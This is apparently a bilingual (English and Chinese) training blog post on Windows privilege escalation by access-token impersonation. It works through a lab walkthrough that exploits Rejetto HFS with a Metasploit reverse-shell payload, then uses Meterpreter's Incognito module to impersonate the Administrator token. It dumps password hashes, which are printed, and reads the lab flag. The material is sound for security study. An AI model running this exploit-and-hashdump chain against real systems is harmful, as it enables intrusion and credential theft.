---
layout: post
title: "Windows Privilege Escalation Token Impersonation With Incognito"
date: "2023-02-16"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Windows Privilege Escalation: Token Impersonation With Incognito
## Windows Access Tokens
Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).

A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.

Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identify and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.

Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.

An access token will typically be assigned one of the following security levels:
* Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
* Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP.

Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.

Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.

## Windows Privileges
The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.

The following are the privileges that are required for a successful impersonation attack:
* SeAssignPrimaryToken: This allows a user to impersonate tokens.
* SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
* SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.

## The Incognito Module
Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.

We can use the incognito module to display a list of available tokens that we can impersonate.

# Windows 特权升级：使用Incognito模拟令牌
## Windows 访问令牌
Windows 访问令牌是 Windows 身份验证过程的核心元素，由本地安全机构子系统服务 (LSASS) 创建和管理。

Windows 访问令牌负责识别和描述系统上运行的进程或线程的安全上下文。 简单地说，访问令牌可以被认为是类似于网络 cookie 的临时密钥，它为用户提供对系统或网络资源的访问权限，而无需在每次启动进程或访问系统资源时提供凭据。

每次用户成功通过身份验证时，winlogon.exe 进程都会生成访问令牌，其中包括与线程或进程关联的用户帐户的身份和权限。 然后将此令牌附加到 userinit.exe 进程，之后由用户启动的所有子进程将从其创建者那里继承访问令牌的副本，并将在同一访问令牌的特权下运行。

Windows 访问令牌根据分配给它们的不同安全级别进行分类。 这些安全级别用于确定分配给特定令牌的特权。

访问令牌通常会被分配以下安全级别之一：
* 模拟级别令牌是 Windows 上非交互式登录的直接结果，通常是通过特定的系统服务或域登录。
* 委托级令牌通常是通过 Windows 上的交互式登录创建的，主要是通过传统登录或通过 RDP 等远程访问协议。

模拟级别令牌可用于在本地系统上模拟令牌，而不是在使用该令牌的任何外部系统上模拟令牌。

委托级令牌构成了最大的威胁，因为它们可用于在任何系统上模拟令牌。

## Windows 权限
模拟访问令牌以提升系统特权的过程将主要取决于分配给已被利用以获得初始访问权限的帐户的特权以及可用的模拟或委托令牌。

以下是成功模拟攻击所需的特权：
* SeAssignPrimaryToken：这允许用户模拟令牌。
* SeCreateToken：这允许用户创建具有管理权限的任意令牌。
* **SeImpersonatePrivilege**：这允许用户在通常具有管理权限的另一个用户的安全上下文下创建进程。

## Incognito 模块
Incognito 是一个内置的 meterpreter 模块，最初是一个独立的应用程序，允许您在成功利用后模拟用户令牌。

我们可以使用Incognito 模块来显示我们可以模拟的可用令牌列表。

# Demo: Windows Privilege Escalation: Token Impersonation With Incognito（演示：Windows 特权升级：使用Incognito进行令牌模拟）
The Local Security Authority Subsystem Service (LSASS) is responsible for creating and managing Windows access tokens on Windows.

Whenever you log in to Windows, the winlogon.exe process will generate a Windows access token for you. And that Windows access token will contain your user account. So your user identify, as well as the privileges associated with that particular user account. That token is then going to be attached to the userinit.exe process, which is used to start up processes or programs for a particular user. So all child processes started by the user will then inherit a copy of the access token from their creator and will run under the privileges of the same access token. So that way, the processes that are running under the privileges of a specific user can be identified, and they're kept separate. So it's really a vital part of the Windows operating system and a core element of the authentication process on Windows. 

In order to elevate our privileges through token impersonation, we need to have the following privileges assigned to our account. Further more, we also need to have impersonation or delegation tokens available on the system that we can use to impersonate.

We primarily need the `SeImpersonatePrivilege`. So the `SeImpersonatePrivilege` will allow us to impersonate the access token of another user account.

Target IP Address: 10.2.16.112

```
service postgresql start && msfconsole -q
workspace -a Impersonate
workspace
setg RHOSTS 10.2.16.112
db_nmap -sV 10.2.16.112
```

```
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set payload windows/x64/meterpreter/reverse_tcp
show options
exploit
```

Perform some local enumeration.

```
meterpreter > sysinfo
Meterpreter : x64/windows
```

Enumerate our current privileges or the user account that we have access to.

```
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
```

You need to make the distinction between `NT AUTHORITY\SYSTEM` and `NT AUTHORITY\LOCAL SERVICE`. `NT AUTHORITY\SYSTEM` means that we have system privileges or the highest privileges associated with a user account on Windows. And the `NT AUTHORITY\LOCAL SERVICE` means that we have the privileges associated with a local service account. 

The reason we have access to a local service account is because we exploited a service, and in this case, the service that we exploited was the Rejetto HFS or Http File Server service. So we get the privileges associated with that service.

Enumerate our current privileges to see whether we can perform token impersonation by typing in `getprivs`.

```
meterpreter > getprivs

SeImpersonatePrivilege
```

We require the `SeImpersonatePrivilege` in order to perform token impersonation. We currently have this privilege, which means we can perform token impersonation, and consequently elevate our privileges.

Just to verify that we don't have any administrative privileges beforehand, I can try and perform a command like `hashdump`, which requires administrative privileges.

```
meterpreter > hashdump
```

Which fails because we don't have sufficient privileges.

We can also try and navigate to the administrator's user directory.

```
meterpreter > cd C:\\
meterpreter > cd Users
meterpreter > cd Administrator
```

You can see operation failed, access is denied. So we definitely need to elevate our privileges.

Now that we've done or verified that we don't have administrative privileges, to begin with, we can begin exploring how to utilize the Incognito module.

When I mentioned that the incognito module is built into meterpreter, what I mean is that you can easily load it by typing in `load incognito`.

```
meterpreter > load incognito
```

We can utilize Incognito within meterpreter to list out, first and foremost, the access tokens available on the system.

So we can say `list_tokens` and say we want to list out the user access tokens `-u`.

```
meterpreter > list_tokens -u
```

```
Delegation Tokens Available
==================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
==================================
No tokens available
```

Impersonation tokens are created as a direct result of logging in or authentication through a non-interactive session. And delegation tokens are created as a direct result of an interactive logon, like either through Winlogon or through remote protocol like RDP.

And in this case, we have two delegation tokens available that we can impersonate. We have the Administrator delegation token, which will provide us with the privileges associated with the administrator account. And then we have the NT AUTHORITY\LOCAL SERVICE delegation available. So if we impersonate the Administrator delegation token, we can get the privileges associated with that user account.

In order to impersonate it, we can type in `impersonate_token`. 

```
meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
```

```
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

We now have the privileges of the administrator account and we have successfully been able to elevate our privileges.

We can verify this by typing in `hashdump`, and in this case, it's going to fail primarily because we need to migrate to a different process. And the reason we need to do that is because the current process that we're currently operating in or under is still has the access token associated with the NT AUTHORITY\LOCAL SERVICE account.

```
meterpreter > hashdump
```

So we can list out the processes available here, and we can migrate to explorer.exe. 

```
3544    3920    explorer.exe    x64 1   ATTACKDEFENSE\Administrator C:\Windows\explorer.exe
```

We can specify the process id of explorer.exe, which is 3544.

```
migrate 3544
```

We get the user count hashes here, and we've successfully elevated our privileges.

```
meterpreter > hashdump
meterpreter > cd C:\\
meterpreter > cd User
meterpreter > cd Administrator
meterpreter > dir
```

That is how to elevate your privileges on a Windows system through token impersonation. And we've taken a look at how to do this through the incognito module.

The reason I've covered this technique is because of its viability and the fact that you will be utilizing this technique when you work within Windows environments or whenever you're conducting a penetration test because it works irregardless of the version of Windows as long as their impersonation tokens or delegation tokens available, you can always impersonate them.

And of course, in order to do that, you need to make sure that you currently have the `SeImpersonatePrivilege`. So this is the first prerequisite, after which if you have access tokens on the target operating system, you can impersonate them using the incognito module.

```
meterpreter > getprivs

SeImpersonatePrivilege
```

# Privilege Escalation: Impersonate
## Overview
A Kali GUI machine and a target machine running vulnerable application are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).  

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the machine using the appropriate Metasploit module. Then, perform privilege escalation to read the flag placed in C\Users\Administrator\Desktop\flag.txt.

Objective: Exploit the application and read the flag.

Instructions:
* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. 
* The IP address of the target machine is mentioned in the file “/root/Desktop/target” 
* Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-2353.pdf

## 复现视频内容
Target IP Address : 10.0.29.37

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 13 database server: main.
msf6 > workspace -a Impersonate
[*] Added workspace: Impersonate
[*] Workspace: Impersonate
msf6 > setg RHOSTS 10.0.29.37
RHOSTS => 10.0.29.37
msf6 > db_nmap -sV 10.0.29.37
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-16 18:17 IST
[*] Nmap: Nmap scan report for 10.0.29.37
[*] Nmap: Host is up (0.0029s latency).
[*] Nmap: Not shown: 995 closed ports
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 80/tcp   open  http          HttpFileServer httpd 2.3
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds
msf6 > services
Services
========

host        port  proto  name           state  info
----        ----  -----  ----           -----  ----
10.0.29.37  80    tcp    http           open   HttpFileServer httpd 2.3
10.0.29.37  135   tcp    msrpc          open   Microsoft Windows RPC
10.0.29.37  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
10.0.29.37  445   tcp    microsoft-ds   open
10.0.29.37  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services

```

```
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.0.29.37       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0
                                         .0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.21.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

```
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.21.2:4444 
[*] Using URL: http://0.0.0.0:8080/e9cP9Th
[*] Local IP: http://10.10.21.2:8080/e9cP9Th
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /e9cP9Th
[*] Sending stage (200262 bytes) to 10.0.29.37
[!] Tried to delete %TEMP%\TuCwOgHO.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.21.2:4444 -> 10.0.29.37:49755) at 2023-02-16 18:22:11 +0530
[*] Server stopped.

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege

```

```
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > cd C:\\
meterpreter > cd Users
meterpreter > cd Administrator 
[-] stdapi_fs_chdir: Operation failed: Access is denied.
```

[FUN WITH INCOGNITO](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)


```
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator

```

```
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                         Path
 ---   ----  ----                     ----  -------  ----                         ----
1620  1492  RpPlgwAtivPKMDS.exe            1
3580  3444  explorer.exe             x64   1        ATTACKDEFENSE\Administrator  C:\Windows\explorer.exe

meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Access is denied.
```

```
meterpreter > migrate 3580
[*] Migrating from 1620 to 3580...
[*] Migration completed successfully.
```

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
meterpreter > cd c:\\
meterpreter > cd Users 
meterpreter > cd Administrator 
meterpreter > cat "C:\Users\Administrator\Desktop\flag.txt"
x28c832a39730b7d46d6c38f1ea18e12meterpreter > 
```

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```